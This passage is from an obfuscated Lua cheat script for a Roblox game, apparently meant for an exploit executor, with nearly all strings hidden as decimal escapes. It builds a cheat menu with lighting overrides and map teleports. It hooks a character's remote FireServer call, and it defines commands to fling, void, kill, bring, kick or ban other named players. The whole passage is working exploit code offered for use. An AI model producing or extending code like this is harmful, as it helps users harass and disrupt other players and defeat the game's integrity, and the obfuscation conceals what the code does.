 _IIIlIIllII.ClockTime = _IllIllIIlI _IIIlIIllII.Brightness = _lIlIIIIlII(_IlIIlllIIl.Br, B.Br, frac) _IIIlIIllII.ExposureCompensation = _lIlIIIIlII(_IlIIlllIIl.EC, B.EC, frac) _IIIlIIllII.Ambient = _IlIIlllIIl.Amb:Lerp(B.Amb, frac) _IIIlIIllII.OutdoorAmbient = _IlIIlllIIl.OA:Lerp(B.OA, frac) _IIIlIIllII.FogColor = _IlIIlllIIl.Fog:Lerp(B.Fog, frac) _IIIlIIllII.FogStart = 0x0 _IIIlIIllII.FogEnd = _lIlIIIIlII(_IlIIlllIIl.FE, B.FE, frac) _IIIlIIllII.GeographicLatitude = 314.8041076660156 _IIIlIIllII.ShadowSoftness = _lIlIIIIlII(_IlIIlllIIl.SR, B.SR, frac) _IIIlIIllII.GlobalShadows = true _IIIlIIllII.EnvironmentDiffuseScale = _lIlIIIIlII(_IlIIlllIIl.ED, B.ED, frac) _IIIlIIllII.EnvironmentSpecularScale = _lIlIIIIlII(_IlIIlllIIl.ES, B.ES, frac) _IIIlIIllII.Technology = _lllIllIIIl() local _IIIllIIlll = _IIIlIIllII:FindFirstChildOfClass("\065\116\109\111\115\112\104\101\114\101") or Instance.new("\065\116\109\111\115\112\104\101\114\101", _IIIlIIllII) _IIIllIIlll.Density = _lIlIIIIlII(_IlIIlllIIl.AD, B.AD, frac) _IIIllIIlll.Offset = _lIlIIIIlII(_IlIIlllIIl.AO, B.AO, frac) _IIIllIIlll.Color = _IlIIlllIIl.AC:Lerp(B.AC, frac) _IIIllIIlll.Decay = _IlIIlllIIl.Adc:Lerp(B.Adc, frac) _IIIllIIlll.Glare = _lIlIIIIlII(_IlIIlllIIl.AG, B.AG, frac) _IIIllIIlll.Haze = _lIlIIIIlII(_IlIIlllIIl.AH, B.AH, frac) local _IIIlIIIlIl = _IIIlIIllII:FindFirstChildOfClass("\083\117\110\082\097\121\115\069\102\102\101\099\116") or Instance.new("\083\117\110\082\097\121\115\069\102\102\101\099\116", _IIIlIIllII) _IIIlIIIlIl.Intensity = _lIlIIIIlII(_IlIIlllIIl.SI, B.SI, frac) _IIIlIIIlIl.Spread = _lIlIIIIlII(_IlIIlllIIl.SS, B.SS, frac) local _lIlllIIIll = _IIIlIIllII:FindFirstChild("\065\117\116\111\083\107\121\066\108\111\111\109") if _lIlllIIIll then pcall( function () _lIlllIIIll:Destroy() end
 ) end
 local _lIlIlIllll = _IIIlIIllII:FindFirstChildOfClass("\067\111\108\111\114\067\111\114\114\101\099\116\105\111\110\069\102\102\101\099\116") if not _lIlIlIllll then _lIlIlIllll = Instance.new("\067\111\108\111\114\067\111\114\114\101\099\116\105\111\110\069\102\102\101\099\116") _lIlIlIllll.Name = "\065\117\116\111\083\107\121\067\067" _lIlIlIllll.Parent = _IIIlIIllII end
 _lIlIlIllll.Brightness = _lIlIIIIlII(_IlIIlllIIl.CCB, B.CCB, frac) _lIlIlIllll.Contrast = _lIlIIIIlII(_IlIIlllIIl.CCC, B.CCC, frac) _lIlIlIllll.Saturation = _lIlIIIIlII(_IlIIlllIIl.CCS, B.CCS, frac) _lIlIlIllll.TintColor = _IlIIlllIIl.CCT:Lerp(B.CCT, frac) _lIlIlIllll.Enabled = true local _lIIlIllIII = _IIIlIIllII:FindFirstChildOfClass("\083\107\121") if _lIIlIllIII then local _lllllllllI = getgenv()._lightingPresetOrig if _lllllllllI and _lllllllllI.MoonAngularSize then _lIIlIllIII.MoonAngularSize = _lllllllllI.MoonAngularSize end
 if _lllllllllI and _lllllllllI.SunAngularSize then _lIIlIllIII.SunAngularSize = _lllllllllI.SunAngularSize end
 end
 end
 end
 if _lIllIlIIll == "\078\111\110\101" then getgenv()._lightingPresetLoop = false getgenv()._tzLoopActive = false if getgenv()._lightingPresetConns then for _lllIlllIIl, _IIIlIlllll in ipairs(getgenv()._lightingPresetConns) do pcall( function () _IIIlIlllll:Disconnect() end
 ) end
 getgenv()._lightingPresetConns = {} end
 _IIlIIIllll() pcall( function () workspace.Terrain.Clouds.Enabled = true end
 ) else _IlIIlIlIlI() pcall( function () workspace.Terrain.Clouds.Enabled = false end
 ) _lllIIIlllI(_lIllIlIIll) if not getgenv()._lightingPresetLoop then getgenv()._lightingPresetLoop = true getgenv()._lightingPresetConns = {} local _lIllllIlII = false local function _IlIlllllII() if _lIllllIlII or not getgenv()._lightingPresetLoop then return end
 local _IIlIIIlIlI = _IlIllIIllI.LightingPreset.Value if _IIlIIIlIlI == "\078\111\110\101" then return end
 _lIllllIlII = true _lllIIIlllI(_IIlIIIlIlI) _lIllllIlII = false end
 local _IIIIlllllI = { ClockTime=true, Brightness=true, ExposureCompensation=true, Ambient=true, OutdoorAmbient=true, FogColor=true, FogStart=true, FogEnd=true, GeographicLatitude=true, ShadowSoftness=true, GlobalShadows=true, EnvironmentDiffuseScale=true, EnvironmentSpecularScale=true, Technology=true, } table.insert(getgenv()._lightingPresetConns, _IIIlIIllII.Changed:Connect( function (prop) if _IIIIlllllI[prop] then _IlIlllllII() end
 end
 ) ) local function _lIlIllIlII(atmo) if not atmo then return end
 table.insert(getgenv()._lightingPresetConns, atmo.Changed:Connect( function () _IlIlllllII() end
 ) ) end
 _lIlIllIlII(_IIIlIIllII:FindFirstChildOfClass("\065\116\109\111\115\112\104\101\114\101")) table.insert(getgenv()._lightingPresetConns, _IIIlIIllII.ChildAdded:Connect( function (_IIlIlIIIII) if _IIlIlIIIII:IsA("\065\116\109\111\115\112\104\101\114\101") then _lIlIllIlII(_IIlIlIIIII) end
 end
 ) ) table.insert(getgenv()._lightingPresetConns, game:GetService("\080\108\097\121\101\114\115").LocalPlayer.CharacterAdded:Connect( function () task.wait(0x0) _IlIlllllII() end
 ) ) end
 if _lIllIlIIll == "\065\117\116\111\045\083\107\121" then getgenv()._tzLoopActive = true task.spawn( function () while getgenv()._tzLoopActive and getgenv()._lightingPresetLoop and not _IllIIlIIll.Unloaded do if _IlIllIIllI.LightingPreset and _IlIllIIllI.LightingPreset.Value == "\065\117\116\111\045\083\107\121" then _lIllllIlII = true pcall(_lllIIIlllI, "\065\117\116\111\045\083\107\121") _lIllllIlII = false else break end
 task.wait(0x1) end
 getgenv()._tzLoopActive = false end
 ) end
 end
 end
 , }) _IIllIlIIlI:AddDropdown("\076\105\103\104\116\105\110\103\084\101\099\104\110\111\108\111\103\121", { Text = "\076\105\103\104\116\105\110\103\032\084\101\099\104\110\111\108\111\103\121", Values = {"\085\110\105\102\105\101\100", "\070\117\116\117\114\101", "\083\104\097\100\111\119\077\097\112", "\086\111\120\101\108", "\067\111\109\112\097\116\105\098\105\108\105\116\121"}, Default = "\085\110\105\102\105\101\100", Callback = function (_lIllIlIIll) local _lIIIlIlllI = { ["\085\110\105\102\105\101\100"] = Enum.Technology.Unified, ["\070\117\116\117\114\101"] = Enum.Technology.Future, ["\083\104\097\100\111\119\077\097\112"] = Enum.Technology.ShadowMap, ["\086\111\120\101\108"] = Enum.Technology.Voxel, ["\067\111\109\112\097\116\105\098\105\108\105\116\121"] = Enum.Technology.Compatibility, } pcall( function () _IIIlIIllII.Technology = _lIIIlIlllI[_lIllIlIIll] or Enum.Technology.Unified end
 ) end
 , }) table.insert(_llIlllIlIl, function () pcall( function () _IIlIlIIlIl.NoWalls:SetValue(false) end
 ) pcall( function () _IIlIlIIlIl.NoTrees:SetValue(false) end
 ) pcall( function () _IIlIlIIlIl.NoDebris:SetValue(false) end
 ) pcall( function () _IIlIlIIlIl.NoSmoke:SetValue(false) end
 ) pcall( function () _IIlIlIIlIl.NoExplosions:SetValue(false) end
 ) pcall( function () _IIlIlIIlIl.AmbientEnabled:SetValue(false) end
 ) pcall( function () _IIlIlIIlIl.RainbowAmbient:SetValue(false) end
 ) pcall( function () _IlIllIIllI.LightingPreset:SetValue("\078\111\110\101") end
 ) getgenv()._lightingPresetLoop = false local _lIlIllIIll = workspace:FindFirstChild("\077\097\112") if _lIlIllIIll then for _lllIlllIIl, _IIIlIlllll in pairs(_llllIIIlII:GetChildren()) do pcall( function () _IIIlIlllll.Parent = _lIlIllIIll end
 ) end
 local _lIIllIlllI = _lIlIllIIll:FindFirstChild("\084\114\101\101\115") if _lIIllIlllI then for _lllIlllIIl, _IIIlIlllll in pairs(_llIIlIlIII:GetChildren()) do pcall( function () _IIIlIlllll.Parent = _lIIllIlllI end
 ) end
 end
 end
 end
 ) end
 local _llIIIlllIl = { ["\065\098\111\118\101\032\084\117\110\110\101\108"] = CFrame.new(-0x12D, 0x252, -0x142), ["\065\114\101\110\097"] = CFrame.new(-0x82, 0x1B8, -0x175), ["\065\116\111\109\105\099\032\083\108\097\115\104"] = CFrame.new(-0x34, 0x62C, 0x62A2), ["\066\097\115\101\112\108\097\116\101"] = CFrame.new(-0x2A, 0x73F, 0x628B), ["\066\101\108\111\119\032\066\097\115\101\112\108\097\116\101"]= CFrame.new(-0x2A, 0x5BD, 0x628B), ["\066\105\103\103\101\114\032\074\097\105\108"] = CFrame.new(0x122, 0x1B8, 0x1D1), ["\069\118\101\110\032\066\105\103\103\101\114\032\074\097\105\108"]= CFrame.new(0x17A, 0x1B7, 0x1C9), ["\068\097\114\107\032\068\111\109\097\105\110"] = CFrame.new(-0x50, 0x54, 0x4FAB), ["\068\101\097\116\104\032\067\111\117\110\116\101\114"] = CFrame.new(-0x42, 0x1D, 0x4F9F), ["\074\097\105\108"] = CFrame.new(0x1B8, 0x1B8, -0x18B), ["\074\097\105\108\032\066\117\116\032\083\109\097\108\108\101\114"]= CFrame.new(0x14, 0x1B7, -0x1CC), ["\077\105\100\100\108\101"] = CFrame.new(0x96, 0x1B9, 0x20), ["\077\111\117\110\116\097\105\110\032\049"] = CFrame.new(0x132, 0x29F, 0x19B), ["\077\111\117\110\116\097\105\110\032\050"] = CFrame.new(-0x1, 0x28D, -0x162), ["\077\111\117\110\116\097\105\110\032\069\100\103\101"] = CFrame.new(-0x129, 0x252, -0x150), ["\086\111\105\100"] = CFrame.new(0x0, -0x2710, 0x0), } local _llllIllIIl = {} for _IIlIIllIlI in pairs(_llIIIlllIl) do _llllIllIIl[#_llllIllIIl+0x1] = _IIlIIllIlI end
 table.sort(_llllIllIIl) local function _llIlIIIllI(_IIIIllllII) local _IIllllIlII = _llIIIlIIll.Character local _llIIlIIlII = _IIllllIlII and _IIllllIlII:FindFirstChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116") if not (_IIllllIlII and _llIIlIIlII) then return end
 task.spawn( function () RunService.RenderStepped:Once( function () _llIIlIIlII.Velocity = Vector3.new() RunService.Heartbeat:Wait() _llIIlIIlII.Velocity = Vector3.new() end
 ) RunService.Heartbeat:Once( function () _llIIlIIlII.CFrame = _IIIIllllII end
 ) end
 ) end
 local _IlIlllIIIl = _lIlIlIllIl.Map:AddLeftGroupbox("\084\101\108\101\112\111\114\116\115", "\109\097\112\045\112\105\110") local _IIIllllIIl = _lIlIlIllIl.Map:AddRightGroupbox("\080\108\097\121\101\114\115", "\117\115\101\114\115") if _IllIlllllI[_lIIIlIIllI] then for _lllIlllIIl, locName in ipairs(_llllIllIIl) do _IlIlllIIIl:AddButton({ Text = locName, Func = function () _llIlIIIllI(_llIIIlllIl[locName]) end
 , }) if locName == "\077\105\100\100\108\101" then _IlIlllIIIl:AddButton({ Text = "\087\101\097\107\101\115\116\032\068\117\109\109\121", Func = function () local _lIllIIlIll = workspace:FindFirstChild("\076\105\118\101") local _IllllIlllI = _lIllIIlIll and _lIllIIlIll:FindFirstChild("\087\101\097\107\101\115\116\032\068\117\109\109\121") local _lIIIlIlIII = _IllllIlllI and (_IllllIlllI:FindFirstChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116") or _IllllIlllI.PrimaryPart) if _lIIIlIlIII then _llIlIIIllI(_lIIIlIlIII.CFrame) end
 end
 , }) end
 end
 else _IlIlllIIIl:AddButton({ Text = "\086\111\105\100", Func = function () _llIlIIIllI(_llIIIlllIl["\086\111\105\100"]) end
 , }) end
 local _llIIIIlllI = nil local function _IIIllIlllI() local _IIIlllIlIl = {} for _lllIlllIIl, _lIIIIIIIII in pairs(Players:GetPlayers()) do if _lIIIIIIIII ~= _llIIIlIIll then _IIIlllIlIl[#_IIIlllIlIl+0x1] = _IIIlllIIll(_lIIIIIIIII) end
 end
 return _IIIlllIlIl end
 local _lllIIllIII = _IIIllllIIl:AddDropdown("\077\097\112\084\097\114\103\101\116\080\108\097\121\101\114", { Values = _IIIllIlllI(), Text = "\084\097\114\103\101\116\032\080\108\097\121\101\114", Default = "", Searchable = true, AllowNull = true, }) local _lIlIllIlll = _IIIllllIIl:AddButton({ Text = "\071\111\116\111", Func = function () if not _llIIIIlllI then return end
 local _IllIIlIIII = _llIIIIlllI.Character local _llIIIIIlII = _IllIIlIIII and _IllIIlIIII:FindFirstChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116") if _IllIIlIIII and _llIIIIIlII then _llIlIIIllI(_llIIIIIlII.CFrame) end
 end
 , }) pcall( function () _lIlIllIlll:SetVisible(false) end
 ) local _lIIIIIlIlI = _IIIllllIIl:AddButton({ Text = "\070\108\105\110\103", Func = function () if not _llIIIIlllI then return end
 if _IIllIlIlIl then return end
 local _IIIlIlIIll = _llIIIIlllI local _llIIlllIlI = _IlIllIIllI.CmdFlingMethod and _IlIllIIllI.CmdFlingMethod.Value or "\086\111\105\100" task.spawn( function () _IIllIlIlIl = true if not _IlIIlIlIII then _lIlIIIIlIl(_IIIlIlIIll) end
 _lIIIllllll(_IIIlIlIIll) _IIllIlIlIl = false if not _IlIIlIlIII then _IllIlIIIII() end
 end
 ) end
 , }) pcall( function () _lIIIIIlIlI:SetVisible(false) end
 ) local _llllIlIllI = false local function _IlIIlIlIII() if _llllIlIllI then return end
 _llllIlIllI = true task.defer( function () pcall( function () _lllIIllIII:SetValues(_IIIllIlllI()) end
 ) _llllIlIllI = false end
 ) end
 local _lIlllIIlII = Players.PlayerAdded:Connect(_IlIIlIlIII) local _llIlIIlIII = Players.PlayerRemoving:Connect( function () task.wait() _IlIIlIlIII() end
 ) local _lIllIIIIlI = "" _lllIIllIII:OnChanged( function (_IlIIIIIlll) if _IlIIIIIlll ~= "" and _IlIIIIIlll == _lIllIIIIlI then pcall( function () _lllIIllIII:SetValue("") end
 ) _lIllIIIIlI = "" _llIIIIlllI = nil pcall( function () _lIlIllIlll:SetVisible(false) end
 ) pcall( function () _lIIIIIlIlI:SetVisible(false) end
 ) return end
 _lIllIIIIlI = _IlIIIIIlll or "" if not _IlIIIIIlll or _IlIIIIIlll == "" then _llIIIIlllI = nil pcall( function () _lIlIllIlll:SetVisible(false) end
 ) pcall( function () _lIIIIIlIlI:SetVisible(false) end
 ) return end
 _llIIIIlllI = _llIIlllllI(_IlIIIIIlll) pcall( function () _lIlIllIlll:SetVisible(_llIIIIlllI ~= nil) end
 ) pcall( function () _lIIIIIlIlI:SetVisible(_llIIIIlllI ~= nil) end
 ) end
 ) getgenv().ChromosomeActive = false local function _IlllIlIIII() local _llIIIlIIll = game:GetService("\080\108\097\121\101\114\115").LocalPlayer local function _IIIlIIIIII() local _IIllllIlII = _llIIIlIIll.Character or _llIIIlIIll.CharacterAdded:Wait() return _IIllllIlII:WaitForChild("\067\111\109\109\117\110\105\099\097\116\101", 0x5) end
 local _IllIIIIllI = _IIIlIIIIII() if _IllIIIIllI and typeof(hookfunction) == "\102\117\110\099\116\105\111\110" then local _lllIIIIIll _lllIIIIIll = hookfunction(_IllIIIIllI.FireServer, function (self, ...) local _lIlIllIlll = {...} if getgenv().ChromosomeActive and type(_lIlIllIlll[0x1]) == "\116\097\098\108\101" and _lIlIllIlll[0x1].Goal == "\076\101\102\116\067\108\105\099\107\082\101\108\101\097\115\101" then return nil end
 return _lllIIIIIll(self, ...) end
 ) end
 end
 _IlllIlIIII() getgenv().addchromosome = function () getgenv().ChromosomeActive = true end
 getgenv().removechromosome = function () getgenv().ChromosomeActive = false end
 local _lllIIIIIII = _lIlIlIllIl.ChangeLogs:AddLeftGroupbox("\072\121\112\101\114\084\101\097\109", "\099\114\111\119\110") _lllIIIIIII:AddLabel("\079\119\110\101\114\058\032\060\102\111\110\116\032\099\111\108\111\114\061\092\034\035\057\050\054\057\102\097\092\034\062\097\114\105\115\116\111\111\101\121\060\047\102\111\110\116\062\092\110\092\110\066\097\100\032\098\097\099\111\110\058\092\110\092\110\060\102\111\110\116\032\099\111\108\111\114\061\092\034\035\056\066\052\053\049\051\092\034\062\098\097\099\111\110\098\097\099\111\110\101\100\060\047\102\111\110\116\062\058\032\083\105\103\109\097\092\110\092\110\060\102\111\110\116\032\099\111\108\111\114\061\092\034\035\049\065\052\070\066\070\092\034\062\115\101\099\114\101\116\120\118\046\060\047\102\111\110\116\062\058\032\080\104\097\110\116\097\115\109\032\083\111\117\114\099\101\032\097\110\100\032\065\117\116\104\111\114\105\122\097\116\105\111\110\032\102\111\114\032\117\115\101\046\092\110\092\110\060\102\111\110\116\032\099\111\108\111\114\061\092\034\035\070\070\051\051\051\051\092\034\062\105\046\097\109\046\097\110\046\097\103\101\110\116\060\047\102\111\110\116\062\058\032\068\101\097\116\104\032\067\111\117\110\116\101\114\032\081\117\111\116\101\115\032\040\116\117\102\102\041", true) getgenv()._disguiseAutoApply = nil do _llIIllIIII = false _disguise_applying = false _disguise_random_cooldown = false _lllIlIllII = {} _disguise_cache = {} _disguise_allowed_cache = {} _IIllIllIll = nil _disguise_spawn_conn = nil _disguise_maintain_conn = nil _IllllIlIIl = nil _disguise_attr_char_conn = nil _disguise_presets = { 0x114079B7, 0x65C99AF7, 0x2E13C, 0x8904336B, 0x21F91DFD5, 0x1393717C3, 0x20052A3C6, 0x16614DA20, 0x76F8FF9, 0x12B32C5A2, 0x12A7A6306, 0x21DB977CB, 0x1AE93999E, 0x9384A32A, 0xB911C4B1, 0xC6D55B40, 0xC1A0050, 0x9AC07BB0, 0xBFCEA25, 0x761EB644, 0xDE652089, 0xC3E72C1, 0x1BA6A3EA9, 0x1839BAAC, 0x1B8474, 0x230AF8190, 0x510DD5D4, 0xB39619B2, 0x86B6ABB1, 0xB4150FD, 0x86D0A3F1, 0x1E27B6811, 0x24DBAD226, 0x16A410CE6, 0x88041F0D, 0x7403C7FF, 0x2758D244, 0x4312241D, 0xB3EC4A67, 0x8958B0A, 0xD53EEE52, 0x783F1958, 0xCF10AD60, 0x21FBA7632, 0x6369A1FA, 0x22A00FCCB, 0x13FDE5BED, 0x1EC9ED77C, 0x10E09EA4, 0x61301474, 0x10744D251, 0x14826C23, 0x63C370, 0x1C6691DE0, 0x418C2020, 0x4778A2B5, 0x51A6237E, 0xD805C80B, 0x8AFD131, 0xCDB7B17, 0x8675B73C, 0x1B4E8970F, 0x1F4709EF, 0x103F293F, 0xF46F5280, 0x121DEF563, 0x437E247E, 0x13698BB1C, 0xC691A6D6, 0x9C13FAC7, 0xFA70AA2D, 0x8C611E3, 0x29F7482B, 0x1BC31CF0, 0xF306263, 0x1E0F396AA, 0x9DBF2909, 0x15DC7212, 0xABF99373, } end
 local _IllllIlIll = _lIlIlIllIl.ChangeLogs:AddRightGroupbox("\073\110\102\111", "\105\110\102\111") _IllllIlIll:AddLabel("\118\101\114\115\105\111\110\058\032\118\050\056\047\048\054\047\050\048\050\054", true) _IllllIlIll:AddDivider() _IllllIlIll:AddLabel("\084\111\032\114\101\112\111\114\116\032\105\115\115\117\101\115\044\032\114\101\097\099\104\032\111\117\116\032\118\105\097\032\068\105\115\099\111\114\100\046", true) _IllllIlIll:AddButton({ Text = "\067\111\112\121\032\068\105\115\099\111\114\100\032\083\101\114\118\101\114", Func = function () pcall( function () setclipboard("\104\116\116\112\115\058\047\047\100\105\115\099\111\114\100\046\103\103\047\084\089\100\083\077\109\081\097\070\057") end
 ) _IllIIlIIll:Notify({ Title = _lIllIllIII("\100\105\115\099\111\114\100\032\115\101\114\118\101\114"), Content = "\099\111\112\105\101\100\032\116\111\032\099\108\105\112\098\111\097\114\100\033\033", _IllIIlIlll = 0x4 }) end
 , }) local _IIlllllIII = _lIlIlIllIl.Settings:AddLeftGroupbox("\083\101\116\116\105\110\103\115", "\115\108\105\100\101\114\115\045\104\111\114\105\122\111\110\116\097\108") local _IIlIlllIII = _lIlIlIllIl.Settings:AddRightGroupbox("\077\101\110\117", "\108\097\121\111\117\116\045\100\097\115\104\098\111\097\114\100") _IIlllllIII:AddDropdown("\078\111\116\105\102\105\099\097\116\105\111\110\083\105\100\101", { Values = { "\076\101\102\116", "\082\105\103\104\116" }, Default = "\082\105\103\104\116", Text = "\078\111\116\105\102\105\099\097\116\105\111\110\032\083\105\100\101", Callback = function (Value) _IllIIlIIll:SetNotifySide(Value) end
 , }) _IIlIlllIII:AddLabel("\077\101\110\117\032\066\105\110\100") :AddKeyPicker("\077\101\110\117\075\101\121\098\105\110\100", { Default = "\076\101\102\116\065\108\116", NoUI = true, Text = "\084\111\103\103\108\101\032\077\101\110\117" }) _IllIIlIIll.ToggleKeybind = _IlIllIIllI.MenuKeybind _IIlllllIII:AddDivider() _IIlllllIII:AddToggle("\075\101\121\098\105\110\100\077\101\110\117\079\112\101\110", { Text = "\083\104\111\119\032\075\101\121\098\105\110\100\115", Default = _IllIIlIIll.KeybindFrame.Visible, Tooltip = "\083\104\111\119\115\032\111\110\045\115\099\114\101\101\110\032\107\101\121\098\105\110\100\032\098\117\116\116\111\110\115\046\032\085\115\101\102\117\108\032\102\111\114\032\109\111\098\105\108\101\046", Callback = function (_lIllIlIIll) _IllIIlIIll.KeybindFrame.Visible = _lIllIlIIll end
 , }) task.spawn( function () if _lIlIIlIlII.TouchEnabled and not _lIlIIlIlII.KeyboardEnabled then if _IllIIlIIll.KeybindFrame then _IllIIlIIll.KeybindFrame.Visible = true end
 pcall( function () _IIlIlIIlIl.KeybindMenuOpen:SetValue(true) end
 ) task.wait(0x8) _IllIIlIIll:Notify({ Title = "\090\075\065\089\084\083\066", Content = "\077\111\098\105\108\101\032\100\101\118\105\099\101\032\100\101\116\101\099\116\101\100\046\032\084\111\032\104\105\100\101\032\111\110\045\115\099\114\101\101\110\032\107\101\121\098\105\110\100\115\044\032\110\097\118\105\103\097\116\101\032\116\111\032\083\101\116\116\105\110\103\115\032\097\110\100\032\100\105\115\097\098\108\101\032\092\034\083\104\111\119\032\075\101\121\098\105\110\100\115\092\034\046", _IllIIlIlll = 0xC, }) end
 end
 ) do local _IllIIIIIIl = {} local _IIlIlIlIll = {} local _llllllIllI = { goto = "\103\111\116\111\047\116\112\047\116\111\032\123\112\108\097\121\101\114\125", _IIlIIIlIll = "\103\111\116\111\047\116\112\047\116\111\032\123\112\108\097\121\101\114\125", to = "\103\111\116\111\047\116\112\047\116\111\032\123\112\108\097\121\101\114\125", fling = "\102\108\105\110\103\047\118\111\105\100\032\123\112\108\097\121\101\114\044\097\108\108\044\111\116\104\101\114\115\125", void = "\102\108\105\110\103\047\118\111\105\100\032\123\112\108\097\121\101\114\044\097\108\108\044\111\116\104\101\114\115\125", loopfling = "\108\111\111\112\102\108\105\110\103\047\108\111\111\112\118\111\105\100\032\123\112\108\097\121\101\114\044\097\108\108\044\111\116\104\101\114\115\125", loopvoid = "\108\111\111\112\102\108\105\110\103\047\108\111\111\112\118\111\105\100\032\123\112\108\097\121\101\114\044\097\108\108\044\111\116\104\101\114\115\125", unfling = "\117\110\102\108\105\110\103\047\117\110\118\111\105\100\032\123\112\108\097\121\101\114\044\097\108\108\125", unvoid = "\117\110\102\108\105\110\103\047\117\110\118\111\105\100\032\123\112\108\097\121\101\114\044\097\108\108\125", unloopfling = "\117\110\102\108\105\110\103\047\117\110\118\111\105\100\032\123\112\108\097\121\101\114\044\097\108\108\125", unloopvoid = "\117\110\102\108\105\110\103\047\117\110\118\111\105\100\032\123\112\108\097\121\101\114\044\097\108\108\125", view = "\118\105\101\119\047\115\112\101\099\116\097\116\101\032\123\112\108\097\121\101\114\125", spectate = "\118\105\101\119\047\115\112\101\099\116\097\116\101\032\123\112\108\097\121\101\114\125", unview = "\117\110\118\105\101\119\047\117\110\115\112\101\099\116\097\116\101", unspectate = "\117\110\118\105\101\119\047\117\110\115\112\101\099\116\097\116\101", whitelist = "\119\104\105\116\101\108\105\115\116\047\097\100\100\119\104\105\116\101\108\105\115\116\032\123\112\108\097\121\101\114\125", addwhitelist = "\119\104\105\116\101\108\105\115\116\047\097\100\100\119\104\105\116\101\108\105\115\116\032\123\112\108\097\121\101\114\125", unwhitelist = "\117\110\119\104\105\116\101\108\105\115\116\047\114\101\109\111\118\101\119\104\105\116\101\108\105\115\116\032\123\112\108\097\121\101\114\125", removewhitelist = "\117\110\119\104\105\116\101\108\105\115\116\047\114\101\109\111\118\101\119\104\105\116\101\108\105\115\116\032\123\112\108\097\121\101\114\125", rejoin = "\114\101\106\111\105\110\047\114\106", rj = "\114\101\106\111\105\110\047\114\106", reset = "\114\101\115\101\116", fixcam = "\102\105\120\099\097\109", bring = "\098\114\105\110\103\032\123\112\108\097\121\101\114\125", kill = "\107\105\108\108\032\123\112\108\097\121\101\114\125", _IlIIllIIlI = "\097\110\099\104\111\114\032\123\112\108\097\121\101\114\125", unanchor = "\117\110\097\110\099\104\111\114\032\123\112\108\097\121\101\114\125", sonic = "\115\111\110\105\099\032\123\112\108\097\121\101\114\125", ban = "\098\097\110\032\123\112\108\097\121\101\114\125", kick = "\107\105\099\107\032\123\112\108\097\121\101\114\125", unload = "\117\110\108\111\097\100\032\123\112\108\097\121\101\114\125", say = "\115\097\121\032\123\112\108\097\121\101\114\125\032\123\109\101\115\115\097\103\101\125", notify = "\110\111\116\105\102\121\032\123\109\101\115\115\097\103\101\125", listrevenantusers = "\108\105\115\116\114\101\118\101\110\097\110\116\117\115\101\114\115", listrev = "\108\105\115\116\114\101\118\101\110\097\110\116\117\115\101\114\115", } local function _lIllIIIllI(str) if not str then return nil end
 for _lllIlllIIl, _IIIIIlIlll in pairs(Players:GetPlayers()) do if (_IIIIIlIlll.Name:lower():find("\094" .. str:lower()) or _IIIIIlIlll.DisplayName:lower():find("\094" .. str:lower())) and _IIIIIlIlll ~= _llIIIlIIll then return _IIIIIlIlll end
 end
 return nil end
 local function _IIllllIIll(_IlIIIIIlll, aliases, _lllIlIlllI) _IllIIIIIIl[_IlIIIIIlll] = _lllIlIlllI if aliases then for _lllIlllIIl, alias in ipairs(aliases) do _IIlIlIlIll[alias] = _lllIlIlllI end
 end
 end
 local function _lIllllIIIl(_IlIIIIIlll, _lIlIllIlll) local _lllIlIlllI = _IllIIIIIIl[_IlIIIIIlll] or _IIlIlIlIll[_IlIIIIIlll] if _lllIlIlllI then _lllIlIlllI(_lIlIllIlll) end
 end
 local _llIIIlllIl = false _IIllllIIll("\103\111\116\111", {"\116\112", "\116\111"}, function (_lIlIllIlll) local _IIIlIlIIll = _lIllIIIllI(_lIlIllIlll[0x1]) if not _IIIlIlIIll and _lIlIllIlll[0x1] and _lIlIllIlll[0x1]:lower() == "\114\097\110\100\111\109" then local _IIlIIIllIl = Players:GetPlayers() for _lIlllIlIll = #_IIlIIIllIl, 0x1, -0x1 do if _IIlIIIllIl[_lIlllIlIll] == _llIIIlIIll then table.remove(_IIlIIIllIl, _lIlllIlIll) end
 end
 _IIIlIlIIll = _IIlIIIllIl[math.random(0x1, #_IIlIIIllIl)] end
 if _IIIlIlIIll then local _IIllllIlII = _IIIlIlIIll.Character local _llIIlIIlII = _IIllllIlII and _IIllllIlII:FindFirstChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116") if _IIllllIlII and _llIIlIIlII then local _lIIllIIllI = _llIIIlIIll.Character local _IIIlIIIllI = _lIIllIIllI and _lIIllIIllI:FindFirstChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116") if _IIIlIIIllI then local function _llIIllllll(_IlIIIIIIll) if typeof(sethiddenproperty) == "\102\117\110\099\116\105\111\110" then pcall( function () sethiddenproperty(_IlIIIIIIll, "\080\104\121\115\105\099\115\082\101\112\082\111\111\116\080\097\114\116", nil) end
 ) end
 pcall( function () _IlIIIIIIll.AssemblyLinearVelocity = Vector3.zero end
 ) pcall( function () _IlIIIIIIll.AssemblyAngularVelocity = Vector3.zero end
 ) pcall( function () _IlIIIIIIll.Velocity = Vector3.zero end
 ) pcall( function () _IlIIIIIIll.RotVelocity = Vector3.zero end
 ) end
 RunService.Heartbeat:Wait() RunService.Heartbeat:Once( function () _llIIllllll(_IIIlIIIllI) _IIIlIIIllI.CFrame = _llIIlIIlII.CFrame _llIIllllll(_IIIlIIIllI) task.spawn( function () for _lllIlllIIl = 0x1, 0x4 do RunService.Heartbeat:Wait() local _IIlIIIlIlI = _llIIIlIIll.Character and _llIIIlIIll.Character:FindFirstChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116") if _IIlIIIlIlI then _llIIllllll(_IIlIIIlIlI) end
 end
 end
 ) end
 ) end
 end
 end
 end
 ) local _lIlIIIIIll = nil _IIllllIIll("\118\105\101\119", {"\115\112\101\099\116\097\116\101"}, function (_lIlIllIlll) local _IIIlIlIIll = _lIllIIIllI(_lIlIllIlll[0x1]) if not _IIIlIlIIll and _lIlIllIlll[0x1] and _lIlIllIlll[0x1]:lower() == "\114\097\110\100\111\109" then local _IIlIIIllIl = Players:GetPlayers() for _lIlllIlIll = #_IIlIIIllIl, 0x1, -0x1 do if _IIlIIIllIl[_lIlllIlIll] == _llIIIlIIll then table.remove(_IIlIIIllIl, _lIlllIlIll) end
 end
 _IIIlIlIIll = _IIlIIIllIl[math.random(0x1, #_IIlIIIllIl)] end
